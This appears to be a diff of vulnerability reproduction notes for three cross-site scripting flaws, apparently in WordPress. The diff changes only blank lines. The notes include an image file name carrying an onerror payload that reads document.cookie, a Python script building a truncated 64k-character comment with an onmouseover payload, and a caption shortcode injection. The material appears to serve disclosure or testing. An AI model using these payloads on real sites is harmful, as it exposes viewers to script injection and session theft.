@@ -8,6 +8,8 @@ Steps:
 2. The file name given to the image to be used here is:
 
 "<img src=a onerror= alert (document.cookie)>.jpg"
+
+
 3. The image is uploaded in a post as an attachment file.
 4. When the post is viewed an alert pops up on the viewers screen.
 
@@ -31,12 +33,14 @@ Steps:
 2. Create a string longer than the specified 64k character limit. Upoun truncation this renders as malformed HTML. Browsers try to fix this which leads to interpretation of the onmouseover exploit.
 3. Create the string using the following python code to generate a file:
 
+
 out = "<a title='xonmouseover=alert(unescape(/hello%20world/.source))style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
 with open('xss.txt','a') as f:
     f.write(out)
     for i in range(64*1024):
         f.write('X')
     f.write("</a>")
+
 
 4. Use the string generated in a comment on WP.
 5. View the comment to get the alerts(pop-ups) due to XSS.
@@ -64,6 +68,7 @@ Steps:
 
 
 TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'"> Click me </a>
+
 
 3. View post to get XSS.
 
